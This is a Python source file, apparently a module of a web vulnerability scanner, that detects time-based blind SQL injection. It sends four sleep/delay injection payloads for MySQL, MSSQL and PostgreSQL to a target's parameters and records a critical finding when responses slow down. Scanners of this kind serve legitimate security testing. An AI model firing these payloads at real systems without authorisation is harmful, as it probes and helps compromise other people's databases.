import time

from awap.engines.attack.base import AttackModule


class SQLiTimeBasedModule(AttackModule):
    module_id = "sqli_time_based"
    vuln_class = "SQL_INJECTION"

    PAYLOADS = [
        "1' OR SLEEP(5)='",
        "1; WAITFOR DELAY '0:0:5'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND pg_sleep(5)--",
    ]

    async def run(self, url: str, params: list[dict], context=None) -> list[dict]:
        findings = []
        for param in params:
            try:
                start = time.time()
                resp, meta = await self.send_payload(
                    url, "GET", "awap_baseline", param["name"], param["type"], context
                )
                if not resp:
                    continue
                baseline_time = time.time() - start
            except Exception:
                continue

            for payload in self.PAYLOADS:
                try:
                    start = time.time()
                    resp, meta = await self.send_payload(
                        url, "GET", payload, param["name"], param["type"], context
                    )
                    if not resp:
                        continue
                    attack_time = time.time() - start
                    if attack_time > baseline_time + 4.5:
                        findings.append({
                            "vuln_class": "SQL_INJECTION",
                            "url": url,
                            "method": "GET",
                            "param": param["name"],
                            "payload": payload,
                            "evidence": f"Time-based delay: +{attack_time - baseline_time:.2f}s",
                            "severity": "CRITICAL",
                            "cvss": 9.8,
                            "confidence": 0.9,
                            "confirmed": True,
                            "request_raw": meta.get("request_raw"),
                            "response_raw": meta.get("response_raw"),
                        })
                        break
                except Exception:
                    pass
        return findings
